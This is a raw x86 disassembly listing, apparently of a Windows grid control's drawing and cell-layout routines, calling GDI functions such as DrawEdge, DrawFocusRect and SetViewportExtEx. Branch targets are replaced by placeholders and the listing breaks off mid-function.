cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_41d9c8
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_41d1d4
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_41dda0
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call DrawFocusRect
jmp r-xdata
sub_46c1c2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e210
mov edx edi
mov eax [ ebx ]
call sub_46c800
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_46ccec
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_4248f4
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_46bbcc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_46bbcc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_46bbc0
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_41cd14
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_46bdfc
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_46bdfc
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_46bdfc
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_46bdfc
pop ecx
mov eax [ ebp - 0x10 ]
call sub_46bbfc
mov eax [ ebp - 0x8 ]
call sub_46bbfc
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_46f8b4
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_46be8c
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_46be8c
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_46be8c
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_46be8c
pop ecx
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41d9c8
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_412f04
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41dda0
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41d9c8
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_412f04
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41dda0
mov eax [ ebx ]
mov si 0xffb5
call sub_403540
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_46ccec
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_46f8b4
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_46d628
mov eax [ ebx ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e234
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41dd6c
jmp r-xdata
sub_46c6bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_46c724
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441f54
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441f54
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_46c7a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_46c724
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_46c6bc
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_46c6bc
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46c800
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441f98
push eax
mov eax ebx
call sub_441f54
mov ecx eax
mov edx esi
mov eax ebx
call sub_46c884
pop esi
pop ebx
retn
sub_46c824
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_46c884
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_46c940
mov eax ebx
mov edx esi
call sub_46c824
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_46c824
pop esi
pop ebx
pop ebp
retn 0x4
sub_46c8b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_46c940
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_46f874
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_46c8b0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_46f894
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_46c8b0
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_46c9c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_46ca38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_46c9c4
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_46c9c4
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46ca68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441f54
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_46cb80
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441f54
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_46cbcc
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441f54
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_46cc18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_441f98
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_441f54
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_46cb80
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_46cbcc
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_46ca68
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_46ca68
pop ecx
sub_46ccec
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_412edc
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_412edc
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_441f98
push eax
mov eax ebx
call sub_441f54
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_441f98
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_441f54
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetWindowExtEx
mov eax ebx
call sub_441f54
mov ecx esp
xor edx edx
call sub_412edc
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_412edc
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_441f98
push eax
mov eax ebx
call sub_441f54
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_441f98
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_441f54
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e234
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_46ce40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_4248ec
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46b610
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ceac
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_46a750
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_46a750
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
